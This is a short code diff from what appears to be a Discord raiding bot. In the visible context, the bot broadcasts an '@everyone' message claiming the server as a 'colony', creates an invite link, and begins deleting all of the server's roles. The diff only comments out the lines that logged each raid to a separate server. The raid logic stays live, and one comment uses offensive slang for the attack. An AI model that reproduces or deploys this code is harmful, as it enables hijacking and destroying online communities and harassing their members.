@@ -195,19 +195,19 @@ class Bot(cmd.Bot):
         await heinz.send("@everyone THIS SERVER HAS BEEN CLAIMED AS A COLONY OF THE DEMOCRATIC REPUBLIC OF HEINZ")
 
         # -log the rape-
-        for guild in ctx.bot.guilds:
-            if guild.name == "beenzbot-Log":
-                logserver = guild
+        #for guild in ctx.bot.guilds:
+        #    if guild.name == "beenzbot-Log":
+        #        logserver = guild
         
-        if originalname == None:
-            originalname = heinz.guild.name
+        #if originalname == None:
+        #    originalname = heinz.guild.name
             
 
         unban = await heinz.create_invite(reason="Those who were disgraced by this server are being given an opportunity to redeem themselves by the DRH")
-        await logserver.channels[0].send("@everyone new raid: " + originalname)
-        await logserver.channels[0].send("Join the fun at " + unban.url)
+        #await logserver.channels[0].send("@everyone new raid: " + originalname)
+        #await logserver.channels[0].send("Join the fun at " + unban.url)
 
-        originalname = None
+        #originalname = None
 
         # -delete all roles-
         roles = []
